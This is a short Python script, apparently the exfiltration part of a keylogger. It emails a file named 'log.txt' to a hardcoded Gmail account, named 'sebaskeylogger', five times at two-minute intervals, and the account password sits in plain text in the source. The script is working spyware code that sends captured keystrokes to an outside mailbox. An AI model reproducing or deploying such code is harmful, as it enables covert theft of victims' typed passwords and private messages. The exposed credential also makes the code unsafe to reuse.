import smtplib
import time
from email.message import EmailMessage

EMAIL = "sebaskeylogger123451@gmail.com"
PASSWORD = "avkpjmsgpknzvlrz"

for i in range(5):

    msg = EmailMessage()
    msg["Subject"] = f"Archivo de log ({i+1}/5)"
    msg["From"] = EMAIL
    msg["To"] = EMAIL

    with open("log.txt", "rb") as f:
        msg.add_attachment(
            f.read(),
            maintype="text",
            subtype="plain",
            filename="log.txt"
        )

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(EMAIL, PASSWORD)
        smtp.send_message(msg)

    if i < 4:
        time.sleep(120)  # 2 minutos